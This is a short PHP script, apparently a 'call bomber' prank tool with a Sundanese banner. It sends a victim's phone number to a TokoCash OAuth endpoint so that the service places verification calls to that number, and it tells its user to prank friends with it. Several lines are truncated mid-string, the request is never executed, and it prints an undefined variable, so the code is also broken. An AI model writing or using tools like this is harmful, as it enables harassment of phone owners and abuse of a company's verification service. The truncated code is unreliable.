<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){                                                         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/>
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=cal>
        curl_close($ch);
                echo $asw."\n\n";
}
echo "Lamun Keur Bosen Euweuh Pagawean Ulah Hulang Huleng Siga Embe Ju>
echo "                             SANDI PIRMANSYAH\n\n";
echo "Jailan Babaturan Salagi Bisa\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
